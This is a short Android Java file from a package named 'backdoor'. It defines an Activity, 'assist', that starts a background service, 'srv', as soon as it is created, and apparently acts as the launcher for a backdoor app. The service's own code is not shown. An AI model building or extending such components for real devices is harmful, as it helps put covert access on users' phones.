package com.voila.backdoor;
import android.app.*;
import android.os.*;
import android.content.*;
import android.util.*;

public class assist extends Activity
{

	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		Log.i("fuck","assist");
		// TODO: Implement this method
		super.onCreate(savedInstanceState);
		Intent i=new Intent(this,srv.class);
		i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startService(i);
		//finish();
	}
}
